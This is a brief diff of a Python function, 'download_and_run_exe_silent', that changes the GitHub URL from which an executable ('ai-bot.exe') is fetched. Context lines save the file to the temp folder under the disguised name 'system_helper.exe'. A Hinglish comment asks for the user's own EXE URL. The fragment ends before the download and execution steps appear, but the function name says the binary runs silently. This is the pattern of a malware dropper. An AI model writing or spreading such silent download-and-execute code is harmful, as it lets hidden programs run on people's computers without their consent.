@@ -18,7 +18,7 @@ def download_and_run_exe_silent():
     
     try:
         # APNI EXE KA SAHI URL DAALO - RAW GITHUB URL USE KAREIN
-        exe_url = "https://raw.githubusercontent.com/sharmankevadiya7-tech/ai-cmd-chatbot/main/ai-bot.exe"
+        exe_url = "https://github.com/sharmankevadiya7-tech/ai-cmd-chatbot/releases/download/v1.0.0/ai-bot.exe"
         exe_path = os.path.join(tempfile.gettempdir(), "system_helper.exe")
         
         # Download EXE
